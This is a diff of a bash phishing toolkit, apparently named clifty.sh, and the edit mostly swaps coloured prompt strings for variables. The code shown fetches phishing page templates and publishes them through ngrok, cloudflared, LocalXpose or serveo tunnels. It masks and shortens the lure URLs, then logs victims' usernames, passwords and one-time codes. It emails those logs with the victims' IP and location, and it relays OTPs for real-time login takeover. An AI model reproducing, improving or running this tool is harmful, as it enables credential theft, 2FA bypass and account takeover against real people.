@@ -49,6 +49,13 @@ plainnetstats="" #to store network type in plain
 tunnel_name="" #to store tunnel type i.e ngrok, etc
 tunnel_id="" #to store tunnel id i.e ngrok, etc
 
+#NOTICE
+info="${GREEN}[${WHITE}#${GREEN}]${YELLOW}"
+info2="${GREEN}[${WHITE}-${GREEN}]${CYAN}"
+add="${BLUE}[${WHITE}+${BLUE}]${GREEN}"
+ask1="${RED}[${WHITE}?${RED}]${ULWHITE}${BOLDWHITE}"
+ask2="${RED}[${WHITE}?${RED}]${YELLOW}"
+
 index=0
 
 #Normal Banner
@@ -118,7 +125,7 @@ colorcodes(){
         wget --no-check-certificate https://gist.githubusercontent.com/NeerajCodz/bfcc3cd84f1fd04ebfb9c8c96fa70c79/raw/2e3233fabf6b298d2d271b638763079ad3eef9d9/colorcodes.sh > /dev/null 2>&1
         mv colorcodes.sh ${assets_dir}
         source "${assets_dir}/colorcodes.sh"
-        echo -e "\n${BLUE}[${WHITE}+${BLUE}]${GREEN} Downloaded colorcodes"
+        echo -e "\n${add} Downloaded colorcodes"
     else
         source "${assets_dir}/colorcodes.sh" > /dev/null 2>&1
     fi
@@ -130,49 +137,49 @@ prompt(){
 directories(){
         if [[ ! -d "${server_dir}" ]]; then
                 mkdir -p "${server_dir}"
-                echo -e "\n${BLUE}[${WHITE}+${BLUE}]${GREEN} Created server directory"
+                echo -e "\n${add} Created server directory"
         fi
         if [[ ! -d "${logs_dir}" ]]; then
                 mkdir -p "${logs_dir}"
-                echo -e "\n${BLUE}[${WHITE}+${BLUE}]${GREEN} Created Logs directory"
+                echo -e "\n${add} Created Logs directory"
         fi
         
         if [[ ! -d "${fetch_dir}" ]]; then
                 mkdir "${fetch_dir}"
-                echo -e "\n${BLUE}[${WHITE}+${BLUE}]${GREEN} Created Fetch directory"
+                echo -e "\n${add} Created Fetch directory"
         fi     
         if [[ -d "${www_dir}" ]]; then
                 rm -rf "${www_dir}"
                 mkdir -p "${www_dir}"
-                echo -e "\n${BLUE}[${WHITE}+${BLUE}]${GREEN} Created www directory"
+                echo -e "\n${add} Created www directory"
         else
                 mkdir -p "${www_dir}"
-                echo -e "\n${BLUE}[${WHITE}+${BLUE}]${GREEN} Created www directory"
+                echo -e "\n${add} Created www directory"
         fi
         if [[ ! -d "${assets_dir}" ]]; then
                 mkdir -p "${assets_dir}"
-                echo -e "\n${BLUE}[${WHITE}+${BLUE}]${GREEN} Created assets directory"
+                echo -e "\n${add} Created assets directory"
         fi
         if [[ ! -d "${dgf_dir}" ]]; then
                 mkdir -p "${dgf_dir}"
-                echo -e "\n${BLUE}[${WHITE}+${BLUE}]${GREEN} Created dgf directory"
+                echo -e "\n${add} Created dgf directory"
         fi
         if [[ ! -d "${dumps_dir}" ]]; then
                 mkdir -p "${dumps_dir}"
-                echo -e "\n${BLUE}[${WHITE}+${BLUE}]${GREEN} Created dumps directory"
+                echo -e "\n${add} Created dumps directory"
         fi
         if [[ ! -d "${update_dir}" ]]; then
                 mkdir -p "${update_dir}"
-                echo -e "\n${BLUE}[${WHITE}+${BLUE}]${GREEN} Created update directory"
+                echo -e "\n${add} Created update directory"
         fi
         if [[ ! -d "${email_dir}" ]]; then
                 mkdir -p "${email_dir}"
-                echo -e "\n${BLUE}[${WHITE}+${BLUE}]${GREEN} Created email directory"
+                echo -e "\n${add} Created email directory"
         fi
         if [[ ! -e "${dgf_dir}/dgf.sh" ]]; then
                 wget --no-check-certificate ${link_clifty_raw}/assets/dgf/dgf.sh > /dev/null 2>&1
                 mv dgf.sh ${dgf_dir}
-                echo -e "\n${BLUE}[${WHITE}+${BLUE}]${GREEN} Downloaded dgf.sh"
+                echo -e "\n${add} Downloaded dgf.sh"
         fi
         if [[ -e ".cld.log" ]]; then
                 rm -rf ".cld.log"
@@ -180,57 +187,57 @@ directories(){
         if [[ ! -e "${dumps_dir}/line.txt" ]]; then
                 wget --no-check-certificate ${link_clifty_raw}/assets/dumps/line.txt > /dev/null 2>&1
                 mv line.txt ${dumps_dir}
-                echo -e "\n${BLUE}[${WHITE}+${BLUE}]${GREEN} Downloaded line.txt"
+                echo -e "\n${add} Downloaded line.txt"
         fi
         if [[ ! -e "${dumps_dir}/space.txt" ]]; then
                 wget --no-check-certificate ${link_clifty_raw}/assets/dumps/space.txt > /dev/null 2>&1
                 mv space.txt ${dumps_dir}
-                echo -e "\n${BLUE}[${WHITE}+${BLUE}]${GREEN} Downloaded space.txt"
+                echo -e "\n${add} Downloaded space.txt"
         fi
         if [[ ! -e "${update_dir}/version.txt" ]]; then
                 wget --no-check-certificate ${link_clifty_raw}/assets/update/version.txt > /dev/null 2>&1
                 mv version.txt ${update_dir}
-                echo -e "\n${BLUE}[${WHITE}+${BLUE}]${GREEN} Downloaded version.txt"
+                echo -e "\n${add} Downloaded version.txt"
         fi
         if [[  ! -e "${fetch_dir}/ip.php" ]]; then
                 wget --no-check-certificate ${link_modules_raw}/sites/fetch/ip.php > /dev/null 2>&1
                 mv ip.php ${fetch_dir}/
-                echo -e "\n${BLUE}[${WHITE}+${BLUE}]${GREEN} Downloaded ip.php"
+                echo -e "\n${add} Downloaded ip.php"
         fi
         if [[ ! -e "${fetch_dir}/index.php" ]]; then
                 wget --no-check-certificate ${link_modules_raw}/sites/fetch/index.php > /dev/null 2>&1
                 mv index.php ${fetch_dir}/
-                echo -e "\n${BLUE}[${WHITE}+${BLUE}]${GREEN} Downloaded index.php"
+                echo -e "\n${add} Downloaded index.php"
         fi
         if [[ ! -e "${fetch_dir}/device.js" ]]; then
                 wget --no-check-certificate ${link_modules_raw}/sites/fetch/device.js > /dev/null 2>&1
                 mv device.js ${fetch_dir}/
-                echo -e "\n${BLUE}[${WHITE}+${BLUE}]${GREEN} Downloaded device.js"
+                echo -e "\n${add} Downloaded device.js"
         fi
         if [[ ! -e "${fetch_dir}/device_post.php" ]]; then
                 wget --no-check-certificate ${link_modules_raw}/sites/fetch/device_post.php > /dev/null 2>&1
                 mv device_post.php ${fetch_dir}/
-                echo -e "\n${BLUE}[${WHITE}+${BLUE}]${GREEN} Downloaded device_post.php"
+                echo -e "\n${add} Downloaded device_post.php"
         fi
         if [[ ! -e "${fetch_dir}/device.js" ]]; then
                 wget --no-check-certificate ${link_modules_raw}/sites/fetch/device.js > /dev/null 2>&1
                 mv device.js ${fetch_dir}/
-                echo -e "\n${BLUE}[${WHITE}+${BLUE}]${GREEN} Downloaded device.js"
+                echo -e "\n${add} Downloaded device.js"
         fi
         if [[ ! -e "${fetch_dir}/device.html" ]]; then
                 wget --no-check-certificate ${link_modules_raw}/sites/fetch/device.html > /dev/null 2>&1
                 mv device.html ${fetch_dir}/
-                echo -e "\n${BLUE}[${WHITE}+${BLUE}]${GREEN} Downloaded device.html"
+                echo -e "\n${add} Downloaded device.html"
         fi
         if [[ ! -e "${email_dir}/sendEmail.sh" ]]; then
                 wget --no-check-certificate ${link_clifty_raw}/assets/email/sendEmail.sh > /dev/null 2>&1
                 mv sendEmail.sh ${email_dir}/
-                echo -e "\n${BLUE}[${WHITE}+${BLUE}]${GREEN} Downloaded sendEmail.sh"
+                echo -e "\n${add} Downloaded sendEmail.sh"
         fi
         if [[ ! -e "${email_dir}/template.json" ]]; then
                 wget --no-check-certificate ${link_clifty_raw}/assets/email/template.json > /dev/null 2>&1
                 mv template.json ${email_dir}/
-                echo -e "\n${BLUE}[${WHITE}+${BLUE}]${GREEN} Downloaded template.json"
+                echo -e "\n${add} Downloaded template.json"
         fi
         if [[ -e "${email_dir}/email.json" ]]; then
                 rm -rf "${email_dir}/email.json"
@@ -239,23 +246,23 @@ directories(){
 
 #Dependencies
 dependencies() {
-        echo -e "\n${BLUE}[${WHITE}+${BLUE}]${GREEN} Installing required packages..."
+        echo -e "\n${add} Installing required packages..."
     if [[ -d "/data/data/com.termux/files/home" ]]; then
         if [[ `command -v proot` ]]; then
             printf ''
         else
-            echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${YELLOW}proot${CYAN}${NC}"
+            echo -e "\n${add} Installing package : ${YELLOW}proot${CYAN}${NC}"
             pkg install proot resolv-conf -y
         fi
     fi
 
         if [[ `command -v php` && `command -v wget` && `command -v curl` && `command -v unzip` ]]; then
-                echo -e "\n${GREEN}[${WHITE}#${GREEN}]${GREEN} Packages already installed."
+                echo -e "\n${info} Packages already installed."
         else
                 pkgs=(php curl wget unzip)
                 for pkg in "${pkgs[@]}"; do
                         type -p "$pkg" &>/dev/null || {
-                                echo -e "\n${GREEN}[${WHITE}#${GREEN}]${CYAN} Installing package : ${YELLOW}$pkg${CYAN}${NC}"
+                                echo -e "\n${info} Installing package : ${YELLOW}$pkg${CYAN}${NC}"
                                 if [[ `command -v pkg` ]]; then
                                         pkg install "$pkg" -y
                                 elif [[ `command -v apt` ]]; then
@@ -307,10 +314,10 @@ kill_pid() {
 #check whether execute permission is granted
 xpermission(){
 	if [[ -x "clifty.sh" ]];then
-		echo -e "\n${GREEN}[${WHITE}#${GREEN}]${GREEN} Execute Permission Granted!!"
+		echo -e "\n${info} Execute Permission Granted!!"
 	else
 	        chmod 777 clifty.sh
-	        echo -e "\n${GREEN}[${WHITE}#${GREEN}]${GREEN} Execute Permission Granted!!"
+	        echo -e "\n${info} Execute Permission Granted!!"
 	fi
 }
 
@@ -320,14 +327,14 @@ update(){
 	if [ $plainnetstats == "online" ]; then
                 { clear; banner; }
                 version=$( cat ${update_dir}/version.txt )
-                echo -e "\n${GREEN}[${WHITE}#${GREEN}]${GREEN} Updating ( Version: ${version} ) ${NC} "
+                echo -e "\n${info} Updating ( Version: ${version} ) ${NC} "
 		cd ${pro_dir}
                 git reset --hard
                 git pull
                 echo -e " "
-                echo -e "\n${GREEN}[${WHITE}#${GREEN}]${GREEN} SUCCESSFULLY UPDATED!! ( Version: ${version} ) ${NC} "
+                echo -e "\n${info} SUCCESSFULLY UPDATED!! ( Version: ${version} ) ${NC} "
                 sleep 2
-                echo -e "\n${GREEN}[${WHITE}#${GREEN}]${MAGENTA} RESTARTING THE TOOL!!${NC} "
+                echo -e "\n${info} RESTARTING THE TOOL!!${NC} "
                 cd ${pro_dir}
                 chmod 777 clifty.sh
                 bash clifty.sh
@@ -342,15 +349,15 @@ update(){
 status() {     
     myip=$(curl -s ipinfo.io/ip --retry 2)
 	if [ -z $myip ]; then
-        plainmyip="offline"
+                plainmyip="offline"
 		myip="${BOLDRED}Offline"
 		netstats="${BOLDRED}Offline"
-        plainnetstats="offline"
+                plainnetstats="offline"
 	else
-        plainmyip="$myip"
+                plainmyip="$myip"
 		myip="${BOLDGREEN}$myip"
 		netstats="${BOLDGREEN}Online"
-        plainnetstats="online"
+                plainnetstats="online"
 	fi           
 }
 status_display(){
@@ -969,12 +976,12 @@ dsites(){
         status
         if [[ ! -d "${sites_dir}" ]]; then
                 if [ $plainnetstats == "online" ]; then
-                        echo -e "\n${BLUE}[${WHITE}+${BLUE}]${GREEN} Downloading Sites..."
+                        echo -e "\n${add} Downloading Sites..."
                         wget --no-check-certificate https://github.com/Alygnt/phisher-modules/archive/refs/heads/sites.zip > /dev/null 2>&1
                         sleep 1
-                        echo -e "\n${BLUE}[${WHITE}-${BLUE}]${GREEN} Unzipping Sites..."
+                        echo -e "\n${info2} Unzipping Sites..."
                         unzip -q sites.zip
-                        echo -e "\n${BLUE}[${WHITE}-${BLUE}]${GREEN} Setting UP..."
+                        echo -e "\n${info2} Setting UP..."
                         mv phisher-modules-sites "${pro_dir}/.sites"
                         rm sites.zip
                         if [ -d "${pro_dir}/.sites" ]; then
@@ -992,7 +999,7 @@ dsites(){
                         homepage
                 fi
         else
-		echo -e "\n${BLUE}[${WHITE}-${BLUE}]${GREEN} Deleting sites..."
+		echo -e "\n${info2} Deleting sites..."
                 rm -rf ${sites_dir}
                 echo -e "\n${BLUE}[${WHITE}-${BLUE}]${BOLDGREEN} SITES ARE DELETED SUCCESSFULLY... ${NA}"
 		homepage
@@ -1024,7 +1031,7 @@ read -p "${temprompt}" reply_logs_menu
                 2 | 02)
 			ls ${logs_dir}/
                         echo -e ""
-                        temprompt="$(echo -e "${RED}[${WHITE}?${RED}]${BOLDWHITE} Enter the log name from the above ${YELLOW}>> ${BLUE}")"
+                        temprompt="$(echo -e "${ask1} Enter the log name from the above ${YELLOW}>> ${BLUE}")"
                         read -p "${temprompt}" LOG_DIR
 			if [ -d "${logs_dir}/${LOG_DIR}" ]; then
                                 { clear; banner; echo ""; }
@@ -1043,12 +1050,12 @@ read -p "${temprompt}" reply_logs_menu
 			fi;;
                 3 | 03)
                         echo -e ""
-                        temprompt="$(echo -e "${RED}[${WHITE}?${RED}]${YELLOW} Do you want to clear every victim logs (Y/n) >> ${BLUE}")"
+                        temprompt="$(echo -e "${ask2} Do you want to clear every victim logs (Y/n) >> ${BLUE}")"
                         read -p "${temprompt}"
 			case $REPLY in
         	                Y | y)
                 	                rm -rf ${logs_dir}
-					echo -e "\n${GREEN}[${WHITE}#${GREEN}]${GREEN} Every logs successfully cleared!! ${NC} "
+					echo -e "\n${info} Every logs successfully cleared!! ${NC} "
 					{ sleep 1; clear; tunnel_menu; };;
                         	N | n | *)
                                 	{ clear;  logs_menu; };;
@@ -1089,7 +1096,7 @@ check_ngrok(){
 	if [ ! -e "${server_dir}/ngrok" ]; then
 		echo -e " "
                 echo -e "${GREEN}[${WHITE}!${GREEN}]${GREEN} NGROK NOT INSTALLED!!${BLUE}"
-                echo -e "${GREEN}[${WHITE}?${GREEN}]${ULWHITE}${BOLDWHITE} Do you want to install now? ${NF} : ${NC}"
+                echo -e "${ask1} Do you want to install now? ${NF} : ${NC}"
                 echo -e " " 
                 echo -e "${BLUE}[1/Y]  ${CYAN} YES ${NC}"
                 echo -e "${BLUE}[2/N/*]${CYAN} NO ${NC}"
@@ -1110,7 +1117,7 @@ check_ngrok(){
 	fi
 }
 install_ngrok() {
-		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing ngrok...${NC}"
+		echo -e "\n${add} Installing ngrok...${NC}"
 		arch=`uname -m`
 		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
 			download 'https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm.tgz' 'ngrok'
@@ -1124,7 +1131,7 @@ install_ngrok() {
 }
 ngrok_token_check(){
         if [ -f "${HOME}/.config/ngrok/ngrok.yml" ]; then
-        echo -e "${RED}[${WHITE}?${RED}]${ULWHITE}${BOLDWHITE}Change ngrok authtoken ${NA}"
+        echo -e "${ask1}Change ngrok authtoken ${NA}"
         echo -e "\n\n${BOLDWHITE} NOTE : ${NF}${WHITE}Ngrok may ban your account. So, create a new account and setup new authtoken ${NA}"
         echo -e "${BLUE}[1/Y]  ${CYAN} Setup new authtoken ${NC}"
         echo -e "${BLUE}[2/N/*]${CYAN} Use old authtoken ${NC}"
@@ -1138,13 +1145,13 @@ ngrok_token_check(){
                 start_ngrok;;
             esac
         else
-                echo -e "\n${GREEN}[${WHITE}#${GREEN}]${BLUE} Setting up authtoken"
+                echo -e "\n${info} Setting up authtoken"
                 ngrok_token_setup
         fi
 }
 ngrok_token_setup(){
     rm -rf $HOME/.ngrok2
-    temprompt="$(echo -e "${GREEN}[${WHITE}?${GREEN}]${ULWHITE}${BOLDWHITE} ENTER YOUR AUTHTOKEN${NA}${YELLOW} >> ${NA}")"
+    temprompt="$(echo -e "${ask1} ENTER YOUR AUTHTOKEN${NA}${YELLOW} >> ${NA}")"
 	read -p "${temprompt}" ntoken
 	${server_dir}/ngrok config add-authtoken ${ntoken}
 	echo -ne "\n${RED}[${WHITE}-${RED}]${GREEN} Upgraded ngrok configurations"
@@ -1182,7 +1189,7 @@ start_ngrok() {
         setup_site_check
 	echo -e "\n"
 	ngrokregion="us"
-        echo -e "${RED}[${WHITE}?${RED}]${ULWHITE}${BOLDWHITE}Change ngrok server region ${NA}"
+        echo -e "${ask1}Change ngrok server region ${NA}"
         echo -e "   ${GREEN}Current region : ${BLUE}${ngrokregion}${NA}"
         echo -e ""
         echo -e "${BLUE}[1/Y]  ${CYAN} YES ${NC}"
@@ -1227,7 +1234,7 @@ check_cloudflared(){
 	if [ ! -e "${server_dir}/cloudflared" ]; then
 		echo -e " "
                 echo -e "${GREEN}[${WHITE}!${GREEN}]${GREEN} CLOUDFLARED NOT INSTALLED!!${BLUE}"
-                echo -e "${GREEN}[${WHITE}?${GREEN}]${ULWHITE}${BOLDWHITE} Do you want to install now? ${NF} : ${NC}"
+                echo -e "${ask1} Do you want to install now? ${NF} : ${NC}"
                 echo -e " " 
                 echo -e "${BLUE}[1/Y]  ${CYAN} YES ${NC}"
                 echo -e "${BLUE}[2/N/*]${CYAN} NO ${NC}"
@@ -1246,7 +1253,7 @@ check_cloudflared(){
 	fi
 }
 install_cloudflared() {
-	echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing Cloudflared...${NC}"
+	echo -e "\n${add} Installing Cloudflared...${NC}"
 	arch=`uname -m`
 	if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
 		download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm' 'cloudflared'
@@ -1291,7 +1298,7 @@ check_localxpose(){
 	if [ ! -e "${server_dir}/loclx" ]; then
 		echo -e " "
                 echo -e "${GREEN}[${WHITE}!${GREEN}]${GREEN} LOCALXPOSE NOT INSTALLED!!${BLUE}"
-                echo -e "${GREEN}[${WHITE}?${GREEN}]${ULWHITE}${BOLDWHITE} Do you want to install now? ${NF} : ${NC}"
+                echo -e "${ask1} Do you want to install now? ${NF} : ${NC}"
                 echo -e " " 
                 echo -e "${BLUE}[1/Y]  ${CYAN} YES ${NC}"
                 echo -e "${BLUE}[2/N/*]${CYAN} NO ${NC}"
@@ -1313,7 +1320,7 @@ check_localxpose(){
 	fi
 }
 install_localxpose() {
-		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing LocalXpose...${NC}"
+		echo -e "\n${add} Installing LocalXpose...${NC}"
 		arch=`uname -m`
 		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
 			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-arm.zip' 'loclx'
@@ -1328,7 +1335,7 @@ install_localxpose() {
 loclx_token_check(){
         auth_f=".localxpose/.access" || auth_f="$HOME/.localxpose/.access"
         if [ -f "${HOME}/.localxpose/.access" ]; then
-                echo -e "${RED}[${WHITE}?${RED}]${ULWHITE}${BOLDWHITE}Change LocalXpose authtoken ${NA}"
+                echo -e "${ask1}Change LocalXpose authtoken ${NA}"
                 echo -e "${BLUE}[1/Y]  ${CYAN} Setup new authtoken ${NC}"
                 echo -e "${BLUE}[2/N/*]${CYAN} Use old authtoken ${NC}"
                 echo -e "${NC}"
@@ -1341,7 +1348,7 @@ loclx_token_check(){
                         echo "" ;;
                 esac
         else
-                echo -e "\n${GREEN}[${WHITE}#${GREEN}]${BLUE} Setting up authtoken"
+                echo -e "\n${info} Setting up authtoken"
                 loclx_token_setup
         fi
 }
@@ -1357,7 +1364,7 @@ start_loclx() {
         loclx_token_check
         setup_site_check
 	echo -e "\n"
-        temprompt="$(echo -e "${GREEN}[${WHITE}?${GREEN}]${ULWHITE}${BOLDWHITE} CHANGE LocalXpose SERVER REGION (Y/eu/us/N)${NA}${YELLOW}>> ${NA}")"
+        temprompt="$(echo -e "${ask1} CHANGE LocalXpose SERVER REGION (Y/eu/us/N)${NA}${YELLOW}>> ${NA}")"
 	read -n1 -p "${temprompt}" opinion
 	[[ ${opinion,,} == "y" ]] && loclx_region="eu" || loclx_region="us"
 	echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching LocalXpose"
@@ -1391,7 +1398,7 @@ check_serveo() {
 	if [[ ! -d "${ssh_dir}"  && -z "$(ssh-keygen -F serveo.net)" ]]; then
 		echo -e " "
         echo -e "${GREEN}[${WHITE}!${GREEN}]${GREEN} Serveo.net NOT INSTALLED!!${BLUE}"
-        echo -e "${GREEN}[${WHITE}?${GREEN}]${ULWHITE}${BOLDWHITE} Do you want to install now? ${NF} : ${NC}"
+        echo -e "${ask1} Do you want to install now? ${NF} : ${NC}"
         echo -e " " 
         echo -e "${BLUE}[1/Y]  ${CYAN} YES ${NC}"
         echo -e "${BLUE}[2/N/*]${CYAN} NO ${NC}"
@@ -1518,7 +1525,7 @@ HOST='127.0.0.1'
 cusport() {
         status_display
         PORT=4444
-        echo -e "${RED}[${WHITE}?${RED}]${ULWHITE}${BOLDWHITE}DO YOU WANT TO SETUP CUSTOM PORT ${NA}"
+        echo -e "${ask1}DO YOU WANT TO SETUP CUSTOM PORT ${NA}"
         echo -e "   ${GREEN}Current port : ${BLUE}${PORT}${NA}"   
         echo -e ""
         echo -e "${BLUE}[1/Y]  ${CYAN} YES ${NC}"
@@ -1639,7 +1646,7 @@ start_php() {
 ##REDIRECT
 redirect_check(){
     status_display
-    echo -e "${GREEN}[${WHITE}?${GREEN}]${ULWHITE}${BOLDWHITE}DO YOU WANT TO CHANGE REDIRECT URL ${NF} : ${NC}"
+    echo -e "${ask1}DO YOU WANT TO CHANGE REDIRECT URL ${NF} : ${NC}"
     echo -e "   ${GREEN}Current Redirect Url : ${BLUE}${rdurl}${NA}"   
     echo -e " "
     echo -e "${BLUE}[1/Y]  ${CYAN} YES ${NC}"
@@ -1696,8 +1703,8 @@ redirect_setup() {
             sed -i "s/\/index.html/https:\/\/${urdurl}/" "${www_dir}/device.html"
 	    else
 		    echo -e "${RED}[${WHITE}!${RED}]${RED} Error Occured in setting up custom redirect URL!!"
-            echo -ne "\n${RED}[${WHITE}?${RED}]${GREEN} Setting up default redirect URL"
-            echo -ne "${RED}[${WHITE}?${RED}]${GREEN} Redirect URL : ${BLUE} ${rdurl}"
+            echo -ne "\n${info} Setting up default redirect URL"
+            echo -ne "${ask1} Redirect URL : ${BLUE} ${rdurl}"
             sleep 3
             urdurl=${rdurl}
             redirect_setup
@@ -1726,7 +1733,7 @@ checklink() {
 ## URL MASKING
 linkmask(){
 	status_display
-        echo -e "${GREEN}[${WHITE}?${GREEN}]${ULWHITE}${BOLDWHITE}DO YOU WANT TO MASK THE URL BELOW ${NF} : ${NA}"
+        echo -e "${ask1}DO YOU WANT TO MASK THE URL BELOW ${NF} : ${NA}"
         echo -e "${GREEN}URL : ${BLUE}${LINK}${NA}"  
         echo -e "" 
         echo -e "${BLUE}[1/Y]  ${CYAN} YES ${NC}"
@@ -1755,12 +1762,12 @@ mask(){
 }
 shorten_keystocks(){
     echo -e ""
-    echo -e "${GREEN}[${WHITE}?${GREEN}]${ULWHITE}${BOLDWHITE}ENTER YOUR CUSTOM URL${NA}${YELLOW} >> ${NA}"
+    echo -e "${ask1}ENTER YOUR CUSTOM URL${NA}${YELLOW} >> ${NA}"
     temprompt="$(echo -e "${GREEN}(eg:https://google.com | www.google.com) ${YELLOW}>> ${BLUE}")"
 	read -p "${temprompt}" CUS_URL
 	checkurl ${CUS_URL}
 	echo -e " "
-    temprompt="$(echo -e "${GREEN}[${WHITE}?${GREEN}]${ULWHITE}${BOLDWHITE} Enter Some KeyStocks (eg: sign-in-2FA)${YELLOW} >> ${BLUE}")"
+    temprompt="$(echo -e "${ask1} Enter Some KeyStocks (eg: sign-in-2FA)${YELLOW} >> ${BLUE}")"
 	read -p "${temprompt}" Keystks #KEY_STOCKS
 	if [[ ${Keystks} =~ ^([0-9a-zA-Z-]*)$ ]]; then
 		echo ""
@@ -1780,7 +1787,7 @@ checkurl() { #3 checking for HTTP|S or WWW input type is valid or not.
 
 check_sendEmail() {
     status_display
-    echo -e "${GREEN}[${WHITE}?${GREEN}]${ULWHITE}${BOLDWHITE}DO YOU WANT TO GET AN EMAIL OF LOGS ${NF} : ${NA}"
+    echo -e "${ask1}DO YOU WANT TO GET AN EMAIL OF LOGS ${NF} : ${NA}"
         echo -ne "\n${ITALICWHITE} NOTE : If your simply testing the tool, then please deny this.. ${NA}"
         echo -ne "${ITALICYELLOW} If too much fake or test emails were found your email will be banned from tool ${NA}"
         echo -e "" 
@@ -1798,14 +1805,14 @@ check_sendEmail() {
         esac
 }
 input_email() {
-    temprompt="$(echo -e "${GREEN}[${WHITE}?${GREEN}]${ULWHITE}${BOLDWHITE} Enter an email address >> ${NA}${BLUE}")"
+    temprompt="$(echo -e "${ask1} Enter an email address >> ${NA}${BLUE}")"
     read -p "${temprompt}" my_email
     echo "${NA}"
     email_regex="^[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}$"
     if [[ $my_email =~ $email_regex ]]; then
         echo ""
     else
-        echo -e "${GREEN}[${WHITE}?${GREEN}]${BOLDYELLOW} The email address ${BOLDBLUE}'$email' ${BOLDYELLOW}is not valid.${NA}"
+        echo -e "${ask2}${BOLDYELLOW} The email address ${BOLDBLUE}'$email' ${BOLDYELLOW}is not valid.${NA}"
         echo -e "    ${YELLOW} Try again..."
         sleep 5
         input_email
@@ -1820,11 +1827,11 @@ if [ "$plainnetstats" == "online" ] && [ -n "$server" ] && [ -n "$site" ] && [ -
             cp "${email_dir}/template.json" "${email_dir}/email.json"
             EmailSuccess=$(bash ${email_dir}/sendEmail.sh "$my_email" "$server" "$site" "${victim_ip[$index]}" "${victim_loc[$index]}" "${victim_id[$index]}" "${victim_pass[$index]}" "${victim_otp[$index]}")
             if [ "$EmailSuccess" == "true" ]; then
-                echo -e "\n${BLUE}[${WHITE}-${BLUE}]${GREEN} Successfully sent email to ${BLUE}${my_email}${NA}"
+                echo -e "\n${info2} Successfully sent email to ${BLUE}${my_email}${NA}"
                 index=$((index + 1))
                 values
             else
-                echo -e "${BLUE}[${WHITE}?${BLUE}]${RED} Failed to send email to ${BLUE}${my_email}${NA}"
+                echo -e "${ask2} Failed to send email to ${BLUE}${my_email}${NA}"
                 index=$((index + 1))
                 values
             fi
@@ -1835,7 +1842,7 @@ if [ "$plainnetstats" == "online" ] && [ -n "$server" ] && [ -n "$site" ] && [ -
 ## Link shorten
 linkshorten(){
 	status_display
-    echo -e "${GREEN}[${WHITE}?${GREEN}]${ULWHITE}${BOLDWHITE}DO YOU WANT TO SHORTEN THE URL BELOW ${NF} : ${NA}"
+    echo -e "${ask1}DO YOU WANT TO SHORTEN THE URL BELOW ${NF} : ${NA}"
     echo -e "   ${GREEN}URL : ${BLUE}${LINK}${NA}"  
     echo -e "" 
     echo -e "${BLUE}[1/Y]  ${CYAN} YES ${NC}"
@@ -1859,7 +1866,7 @@ linkshorten(){
 check_site() { [[ ${1} != "" ]] && curl -s -o "/dev/null" -w "%{http_code}" "${1}https://github.com"; }
 shorten() {
 	echo -ne "\n${RED}[${WHITE}-${RED}]${GREEN} SHORTENING URL : ${YELLOW} ${LINK}"
-	echo -ne "\n${RED}[${WHITE}-${RED}]${YELLOW} Shortening maytake some time (approx 30 seconds)"
+	echo -ne "\n${info} Shortening maytake some time (approx 30 seconds)"
 	isgd="https://is.gd/create.php?format=simple&url="
 	shortcode="https://api.shrtco.de/v2/shorten?url="
 	tinyurl="https://tinyurl.com/api-create.php?url="
@@ -1943,7 +1950,7 @@ displaylink(){
 
 #Capture data check
 capture_data_check(){
-    echo -ne "\n${RED}[${WHITE}-${RED}]${YELLOW} Waiting for Victim to open the link, ${MAGENTA}Ctrl + C ${YELLOW}to exit..."
+    echo -ne "\n${info} Waiting for Victim to open the link, ${MAGENTA}Ctrl + C ${YELLOW}to exit..."
     status_update
 	if [ "${capture_type}" == "NOTP" ];then
         capture_data_notp
@@ -2128,7 +2135,7 @@ capture_pass() {
                 echo -e "${RED}[${WHITE}-${RED}]${GREEN} Password looks valid! ${RESETBG}${NA}"
         else
                 victim_pass_valid[$index]=false
-                echo -e "${RED}[${WHITE}-${RED}]${YELLOW} Password looks Invalid! ${RESETBG}${NA}"
+                echo -e "${info} Password looks Invalid! ${RESETBG}${NA}"
         fi
         echo -ne "\n${CYAN}Saved in Logs"
         cat ${dumps_dir}/space.txt >> ${final_log_name}
@@ -2148,7 +2155,7 @@ capture_otp() {
                 echo -e "${RED}[${WHITE}-${RED}]${GREEN} OTP looks valid! ${RESETBG}${NA}"
         else
                 victim_otp_valid[$index]=false
-                echo -e "${RED}[${WHITE}-${RED}]${YELLOW} OTP looks Invalid! ${RESETBG}${NA}"
+                echo -e "${info} OTP looks Invalid! ${RESETBG}${NA}"
         fi
         echo -ne "\n${CYAN}Saved in Logs"
         cat ${dumps_dir}/space.txt >> ${final_log_name}
@@ -2291,7 +2298,7 @@ capture_data_notp() {
         if [[ -e "${www_dir}/usernames.txt" ]]; then
             capture_id
 			capture_pass
-			echo -e "\n${RED}[${WHITE}-${RED}]${YELLOW} Waiting for Next Login Info, ${BLUE}Ctrl + C ${YELLOW}to exit. "
+			echo -e "\n${info} Waiting for Next Login Info, ${BLUE}Ctrl + C ${YELLOW}to exit. "
         fi
         sleep 0.75
         sendEmail
@@ -2308,12 +2315,12 @@ capture_data_ootp() {
         sleep 0.75
         if [[ -e "${www_dir}/usernames.txt" ]]; then
             capture_id
-			echo -ne "\n${RED}[${WHITE}-${RED}]${YELLOW} Waiting for OTP > "
+			echo -ne "\n${info} Waiting for OTP > "
 			echo -ne "\n${ITALICWHITE} NOTE : OTP will only be sent to victim when you login to offical website ${NA}"
         fi
 		if [[ -e "${www_dir}/otp.txt" ]]; then
             capture_otp
-			echo -e "\n${RED}[${WHITE}-${RED}]${YELLOW} Waiting for Next Login Info, ${BLUE}Ctrl + C ${YELLOW}to exit. "
+			echo -e "\n${info} Waiting for Next Login Info, ${BLUE}Ctrl + C ${YELLOW}to exit. "
         fi
         sleep 0.75
         sendEmail
@@ -2331,12 +2338,12 @@ capture_data_potp() {
